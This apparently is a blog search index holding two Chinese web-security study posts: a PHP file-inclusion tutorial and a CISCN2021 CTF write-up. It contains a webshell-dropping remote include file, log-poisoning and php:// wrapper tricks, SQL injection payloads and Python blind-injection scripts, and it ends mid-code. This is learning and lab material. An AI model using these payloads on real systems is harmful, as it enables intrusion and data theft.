<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>文件包含漏洞学习</title>
      <link href="posts/38386.html"/>
      <url>posts/38386.html</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><strong>什么是文件包含？</strong></p><p>将需要重复调用的函数写入一个文件，对该文件进行包含时产生的操作。</p><p><strong>漏洞产生原因</strong></p><p>文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出，改变URL中filename的值即可改变代码中包含的文件。</p><p><strong>PHP中的文件包含函数</strong></p><ul><li><code>include</code> 函数出现错误时，会抛出警告，但程序仍继续执行。</li><li><code>include_once</code> 同 include ，但仅包含一次（避免函数重定义，变量重新赋值等问题）。</li><li><code>require</code> 函数出现错误时，会直接报错并退出程序执行。</li><li><code>require_once</code> 同 require ，但仅包含一次。</li></ul><h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>被包含的文件在服务器本地</p><p><strong>包含本地敏感文件</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527204155548.png" alt="image-20210527204155548"></p><p>敏感文件默认路径列举：</p><ul><li><p>windows系统:</p><p>C:\windows\win.ini            //基本系统配置文件</p><p>C:\boot.ini                      //查看系统版本</p><p>C:\windows\system32\inetsrv\MetaBase.xml                     //iis配置文件</p><p>C:\windows\repair\same                        //存储windows系统初次安装密码</p><p>C:\ProgramFiles\mysql\my.ini                        //mysql配置信息</p><p>C:\ProgramFiles\mysql\data\mysql\user.MYD                    //mysql root密码</p><p>C:\windows\php.ini                             //php配置信息</p></li><li><p>linux/unix系统:</p><p>/etc/passwd                                   //账户信息<br>/etc/shadow                                  //账户密码文件<br>/usr/local/app/apache2/conf/httpd.conf                    //Apache2默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhost.conf                     //虚拟网站配置<br>/usr/local/app/php5/lib/php.ini                             //php相关配置<br>/etc/httpd/conf/httpd.conf                          //apache配置信息<br>/etc/my.conf                               //mysql配置文件</p></li></ul><p><strong>包含上传文件</strong></p><blockquote><p>包含文件的内容只要符合php语法都能被当成php代码进行执行，无关后缀名是什么。</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527203723802.png" alt="image-20210527203723802"></p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>被包含的文件在远程服务端</p><blockquote><p>条件：php.ini中设置allow_url_fopen = On(默认)、allow_url_include = On ( php5.2后默认为off )</p></blockquote><p><strong>包含远程文件</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527210839912.png" alt="image-20210527210839912"></p><p><strong>包含远程shell</strong></p><p>remoteshell.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$myfile</span>=fopen(<span class="string">&#x27;test.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;can&#x27;t open the file!&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$payload</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\32662\AppData\Roaming\Typora\typora-user-images\image-20210527214700058.png" alt="image-20210527214700058"></p><p>包含构造好的文件后，会在当前目录下创建test.php，即写入一句话木马，可以对其进行利用，后续也可用菜刀进行连接</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527215840715.png" alt="image-20210527215840715"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527215247349.png" alt="image-20210527215247349"></p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p><strong>利用file协议</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527232103966.png" alt="image-20210527232103966"></p><p><strong>利用 php://filter 协议</strong></p><p>可以此获取网页源码，php代码等</p><blockquote><p>php://filter/read=convert.base64-encode/resource=index.php</p><p>(“read=” 可省略)</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527233338272.png" alt="image-20210527233338272"></p><p>对其进行base64解码得到源码</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527233513514.png" alt="image-20210527233513514"></p><p><strong>利用 php://input 协议</strong></p><p>主要用来接收post数据，将post请求中的数据作为php代码执行。</p><p>条件：allow_url_include = On</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527235351691.png" alt="image-20210527235351691"></p><p><strong>本地文件包含配合日志文件</strong></p><p>如果知道服务器日志文件的路径，可在URL请求中添加攻击代码，此代码会被记录在服务器日志文件内，再对日志文件进行包含，攻击代码便会被执行。</p><p>测试靶场：DVWA</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527230821426.png" alt="image-20210527230821426"></p><p>在日志文件中可见，部分字符被URL编码，代码无法执行，可用burpsuite抓包改回。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231123446.png" alt="image-20210527231123446"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231156043.png" alt="image-20210527231156043"></p><p>利用文件包含漏洞包含此日志文件，即可执行插入代码</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210527231313524.png" alt="image-20210527231313524"></p><h1 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h1><ul><li>%00截断</li></ul><p>条件：magic_quotes_gps=off      php版本&lt;5.3.4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;inc/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.html&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>?page=../../../../phpinfo.php%00</p><ul><li>重写</li></ul><p>?page=….//….//….//phpinfo.php</p><ul><li>利用php伪协议</li></ul><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>最简单的，我们可以通过上传一个包含webshell内容的图片，然后通过包含此图片即可得到一个可以控制的webshell。</p><ul><li>获取敏感信息</li><li>执行任意命令</li><li>获取服务器权限</li></ul><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>尽量不使用动态包含，无需情况下设置allow_url_include和allow_url_fopen为关闭;</li><li>对可以包含的文件进行限制︰使用白名单的方式，或者设置包含的目录，open_basedir ;</li><li>严格检查用户输入，参数中不允许出现../之类的目录跳转符;</li><li>严格检查变量是否初始化;</li><li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从CISCN2021初赛习得</title>
      <link href="posts/59734.html"/>
      <url>posts/59734.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>这里简要记录下我的思路以及学到的姿势。</p><p>一开始经过几次尝试发现uname处存在注入点且为单引号括号闭合，在sql语句为真时，返回 login ,为假时空白，于是就傻乎乎认为是布尔盲注，而忽略了加引号时页面会返回报错信息。所以可以用更为简单的报错注入的题，而我却用布尔盲注捣鼓了半天。得到库名后，发现information被过滤，无法查表和列名。艰难绕过后，利用无列名注入，mysql字符串逐位比较把flag给试了出来，但可能因为大小写的原因导致提交错误，白干一场（后来才知道mysql字符串比较不区分大小写😂）解决方法见下文。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210515183010308.png" alt="image-20210515183010308"></p><p>正解报错注入</p><p>暴库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;)||extractvalue(1,concat(&#39;~&#39;,database()))%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p>利用sqlmap获取表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot; 1.txt&quot; –dump -D “security”</span><br></pre></td></tr></table></figure><p>暴列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;) ||updatexml(&quot;~&quot;,concat(&quot;~&quot;,(select * from (select * from flag as a join flag b)c)),&quot;~&quot;)%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p>得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1&#39;)||updatexml(1,((select &#96;e4f94828-d693-4ea1-8759-051b98824ce3&#96; from flag limit 0,1)),1)%23&amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure><p><strong>新姿势&amp;&amp;不足</strong></p><ol><li>当information_schema被过滤，无法查库中表和列时，可以用<code>sys.schema_table_statistics_with_buffer</code>、<code>sys.x$schema_flattened_keys</code> 等来爆表。</li><li>当列名不知道时，一般利用information_schema_columns；再者可利用join进行无列名注入得到列名；若在join被过滤或盲注等情况，此时则可以考虑mysql字符串逐位比较大小。</li><li>当<code>||</code> 、<code>or</code> 等常用字符过滤时也许可以使用 <code>^</code> 异或这个符号，如<code>?id=1&#39;^(payload)^1--+</code></li><li>post传参的Python脚本编写待加强</li></ol><h3 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass information_schema"></a>bypass information_schema</h3><blockquote><p>Mysql5.7后新增了sys库，其基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。可通过sys库取代information_schema获取表名。</p></blockquote><p>sys 中可利用的视图</p><ul><li><strong>sys.schema_table_statistics_with_buffer</strong></li><li><strong>sys.x$schema_table_statistics_with_buffer</strong></li><li><strong>sys.schema_auto_increment_columns</strong></li><li><strong>sys.x$ps_schema_table_statistics_io</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><p>当or被过滤（没过滤in）时，可利用innodb存储引擎获取表名</p><ul><li><strong>mysql.innodb_table_stats</strong> (此表中库名字段是database_name，而非table_schema)</li><li><strong>mysql.innodb_index_stats</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h3 id="join"><a href="#join" class="headerlink" title="join"></a>join</h3><p>通过join进行无列名注入获取列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b)c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;id&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;username&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id,username))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure><p>在学习大佬wp时还看到利用join绕过逗号过滤，tql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p>不用逗号</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select * from (select 1)a join (select 2)b join (select 3)c--+</span></span><br></pre></td></tr></table></figure><h3 id="mysql字符串逐位比较"><a href="#mysql字符串逐位比较" class="headerlink" title="mysql字符串逐位比较"></a>mysql字符串逐位比较</h3><p>给定两个字符串，会各取两个字符串的首字符ascii码来比较，如下图</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517195727369.png" alt="image-20210517195727369"></p><p>由此可知后一字符串首位为f，若首位相同，则会比较下一位，以此类推便可得到后一字符串内容。</p><p>但mysql比较两个字符串是不区分大小写的！本应是B(66)&lt;a(97)</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517210315933.png" alt="image-20210517210315933"></p><p>怎么能达到区分大小写的效果呢？我在这篇文章中找到答案（大佬tql！）</p><p><a href="https://nosec.org/home/detail/3830.html">无需“in”的SQL盲注</a></p><p>将字符串转换为二进制格式后，会强制进行字节对字节的比较</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517215444478.png" alt="image-20210517215444478"></p><p>但binary函数中的in被过滤了，无法使用。</p><p>新的方法是用concat拼接一个JSON对象，即<code>select concat(&#39;B&#39;,cast(0 as json))</code>也会返回一二进制字符串</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210517222742475.png" alt="image-20210517222742475"></p><p>也可以把字符转化为十六进制后比较，B(0x42)&lt;a</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>由于题目环境已关，这里在BUUCTF找到了一道类似的题以练习。</p><p>[GYCTF2020]Ezsqli</p><p>fuzz后，发现这里也过滤了information，考虑利用sys</p><p>简单尝试后，发现没有回显，也没有报错，当语句为真时返回Nu1L，为假时返回V&amp;N，考虑布尔盲注。</p><p>判断表名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://ead240c2-1793-45a6-8939-a0db7ad04826.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))=&#123;&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        py = payload.<span class="built_in">format</span>(j,i)</span><br><span class="line">        post_data = &#123;<span class="string">&#x27;id&#x27;</span>: py&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            result += <span class="built_in">chr</span>(i)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到两个表，users233333333333333,f1ag_1s_h3r3_hhhhh</p><p>由于过滤了join，无法知道列名，采用mysql字符串逐位比较来获取第二个表的内容。</p><p>判断表中有两个字段，猜测flag在第二列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2||((select 1)&gt;(select * from f1ag_1s_h3r3_hhhhh))      bool(false)</span><br><span class="line">id&#x3D;2||((select 1，1)&gt;(select * from f1ag_1s_h3r3_hhhhh))    Nu1l</span><br><span class="line">id&#x3D;2||((select 1,1,1)&gt;(select * from f1ag_1s_h3r3_hhhhh))   bool(false)</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ead240c2-1793-45a6-8939-a0db7ad04826.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    res = <span class="string">&#x27;0x&#x27;</span> + res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload=<span class="string">&quot;2||((select 1,&#123;&#125;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(str_hex(flag+<span class="built_in">chr</span>(j)))</span><br><span class="line">        <span class="comment">#payload=&quot;2||((select 1,(concat(&#123;&#125;,cast(0 as json)))) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;.format(flag+chr(j))</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> flag[-<span class="number">1</span>] ==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>wp参考 <a href="https://r0yanx.com/2020/10/28/fslh-writeup/">fslh-writeup</a></p><p>扫描后台目录得到index.php.swp，少见的备份文件格式，其是 vim 打开文件后的缓存文件<br>得到源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 